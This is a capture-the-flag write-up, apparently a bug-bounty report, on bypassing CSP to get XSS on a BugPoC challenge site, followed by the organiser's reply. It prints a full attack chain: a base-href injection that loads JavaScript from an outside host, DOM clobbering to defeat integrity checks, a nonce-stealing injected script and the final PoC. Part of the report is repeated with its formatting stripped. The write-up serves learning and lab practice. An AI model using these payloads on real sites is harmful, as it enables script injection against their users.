title: [BugPOC and Amazon XSS CTF writeup] A CSP Bypass Story

profile.name: BugPoC
profile.about: A Platform to Build and Share Proof-of-Concepts for Bug Bounty Submissions, PenTest Deliverables, & Red Team Reports.

vulnerability_information:
## Summary/Description:

There were quite multiple restrictions imposed while executing JavaScript on the website. I have divided them into three segments which are explained below

*  **Bypassing the iframe loading restriction** 

The URL https://wacky.buggywebsite.com/frame.html?param=Hello,%20World when accessed directly was throwing an error "This page can only be viewed from an iframe." So I looked at the source of the page and found that the following condition needs to be met to access the page.

```javascript
if (window.name == 'iframe') {
```

So it was a simple bypass I simply created a PoC on bugpoc.com and provided the following line my script tags

```javascript
window.open(" https://wacky.buggywebsite.com/frame.html?param=Hello,%20World", "iframe")
```
After executing above script I was able to access the `frame.html` without the parent page. Also, it loaded the file `files/analytics/js/frame-analytics.js` which was only being loaded if the above mention condition was satisfied.

*  **Fetching the remote JavaScript file**

Now while looking at the query string the `param` parameter was feeding link to the page and was being reflected in the title tag and there was no sanitization for the HTML entities, So I tried the following payload `https://wacky.buggywebsite.com/frame.html?param=</title><script>alert(1)</script>` but I got restricted by the CSP.

Now instead of providing inline scripts I tried to leverage the relative path `files/analytics/js/frame-analytics.js` by using the following payload `https://wacky.buggywebsite.com/frame.html?param=</title><base href="https://red-assassin.github.io">` after providing the payload the `files/analytics/js/frame-analytics.js` file started loading from my remote server.

This time I quickly hosted a file at `https://red-assassin.github.io/files/analytics/js/frame-analytics.js` and again I tried executing the payload `https://wacky.buggywebsite.com/frame.html?param=</title><base href="https://red-assassin.github.io">` but guess what? I again got restricted and this time because of the `integrity` attribute inside the script tag which was validating the content of the external JS file.

*  **DOM Clobbering and Crafting the ultimate JS payload**

Now I again started looking at the code and this time the following lines got my attention

```javascript
window.fileIntegrity = window.fileIntegrity || {
			'rfc' : ' https://w3c.github.io/webappsec-subresource-integrity/',
			'algorithm' : 'sha256',
			'value' : 'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=',
			'creationtime' : 1602687229
		}
```
It took me half an hour to recall the above pattern and then I realized that window objects can be clobbered by providing proper payloads so I visited https://portswigger.net/web-security/dom-based/dom-clobbering and started reading to refresh my DOM clobbering concepts and soon again I modified my payload and used the following one

```
https://wacky.buggywebsite.com/frame.html?param=</title><base href="https://red-assassin.github.io"><a id=fileIntegrity><a id=fileIntegrity name=value href=absc>
```

The above payload will  group the <a> tags together in a DOM collection. The DOM clobbering vector then overwrites the `fileIntegrity` reference with this DOM collection. A name attribute is used on the last anchor element in order to clobber the `value` property of the `fileIntegrity` object, which points to a garbage value and hence it will bypass the integrity validation of the `script` tag, but this time also I again got pinned down by the following error .

{F1066080}

This one was the easiest to tackle I simply crafted  the following JS code and put it at https://red-assassin.github.io/files/analytics/js/frame-analytics.js

```javascript
setTimeout(() => {
  var nonce = window.parent.document.getElementsByTagName("script")[0].nonce;
  console.log(nonce);
  var x = window.parent.document.createElement("script");
  x.setAttribute("nonce", nonce);
  x.innerHTML="alert(origin)";
  window.parent.document.body.appendChild(x);
}, 5000);
```

The above JS code will simply create a "script" element inside the parent window and also will add the nonce value to tackle the CSP restrictions. Once I uploaded the above code I created my final PoC

```html
<html>
	<!-- TODO implement -->
  <head>
  </head>
  <body>
    <script>
window.open("https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20href=%22https://red-assassin.github.io%22%3E%3Ca%20id=fileIntegrity%3E%3Ca%20id=fileIntegrity%20name=value%20href=absc%3E", "iframe");
</script>
  </body>
</html>
```
After executing above PoC, I got the XSS pop up :)

{F1066085}
{F1066086}

## Steps To Reproduce:

Below provided PoC is hosted on bugpoc.com

* Open https://bugpoc.com/poc#bp-pnUV8pIC
* Use the id `bp-pnUV8pIC` and password  `coldFiG84` for above PoC
* Make sure to allow pop-up windows, wait for 5 seconds and alert box will appear.

## Impact

XSS on https://wacky.buggywebsite.com

  • Bypassing the iframe loading restriction

if (window.name == 'iframe') {

So it was a simple bypass I simply created a PoC on bugpoc.com and provided the following line my script tags

window.open(" https://wacky.buggywebsite.com/frame.html?param=Hello,%20World", "iframe")

After executing above script I was able to access the frame.html without the parent page. Also, it loaded the file files/analytics/js/frame-analytics.js which was only being loaded if the above mention condition was satisfied.

I again got restricted and this time because of the integrity attribute inside the script tag which was validating the content of the external JS file.

Now I again started looking at the code and this time the following lines got my attention

window.fileIntegrity = window.fileIntegrity || {
            'rfc' : ' https://w3c.github.io/webappsec-subresource-integrity/',

https://wacky.buggywebsite.com/frame.html?param=</title><base href="https://red-assassin.github.io"><a id=fileIntegrity><a id=fileIntegrity name=value href=absc>

The above payload will group the <a> tags together in a DOM collection. The DOM clobbering vector then overwrites the fileIntegrity reference with this DOM collection. A name attribute is used on the last anchor element in order to clobber the value property of the fileIntegrity object, which points to a garbage value and hence it will bypass the integrity validation of the script tag, but this time also I again got pinned down by the following error .

This one was the easiest to tackle I simply crafted the following JS code and put it at https://red-assassin.github.io/files/analytics/js/frame-analytics.js

setTimeout(() => {
  var nonce = window.parent.document.getElementsByTagName("script")[0].nonce;
  console.log(nonce);
  var x = window.parent.document.createElement("script");
  x.setAttribute("nonce", nonce);
  x.innerHTML="alert(origin)";
  window.parent.document.body.appendChild(x);
}, 5000);

The above JS code will simply create a "script" element inside the parent window and also will add the nonce value to tackle the CSP restrictions. Once I uploaded the above code I created my final PoC

<html>
    <!-- TODO implement -->
  <head>
  </head>
  <body>
    <script>
window.open("https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20href=%22https://red-assassin.github.io%22%3E%3Ca%20id=fileIntegrity%3E%3Ca%20id=fileIntegrity%20name=value%20href=absc%3E", "iframe");

Steps To Reproduce:

Below provided PoC is hosted on bugpoc.com

  • Open https://bugpoc.com/poc#bp-pnUV8pIC
  • Use the id bp-pnUV8pIC and password coldFiG84 for above PoC

activities.message: Just a note Kindly wait for 5 secs for XSS popup to appear, as I have set a timeout function in my remote JS code.
activities.markdown_message: Just a note Kindly wait for 5 secs for XSS popup to appear, as I have set a timeout function in my remote JS code.

activities.message:
Great job! Thanks for participating in our CTF Challenge! Your solution is correct, however unfortunately the 1st and 2nd place prizes have already been claimed. But do not worry - **your name has been entered into a Raffle to win $100!** 10 random winners will be announced on **November 10th**. Stay tuned- we will re-open and award this submission if you win!

This challenge also serves as the *first interview* for select Amazon Security Engineering roles! Please fill out [this form](https://forms.gle/qWFGpzMgANEBdDfT9) if you are interested in **skipping the first round of interviews** for select positions.

Reminder - the best blog write-up about this challenge will win $300! Submit yours *11/07 10pm EDT - 11/09 10PM EDT* by tagging @bugpoc_official on Twitter.

BTW, in the future, you can use the [Mock Endpoint](https://bugpoc.com/testers/other/mock) to create a server response, then use the [Flexible Redirector](https://bugpoc.com/testers/other/redir) to make it accessible from many URL patterns. No need to host your own infra :)
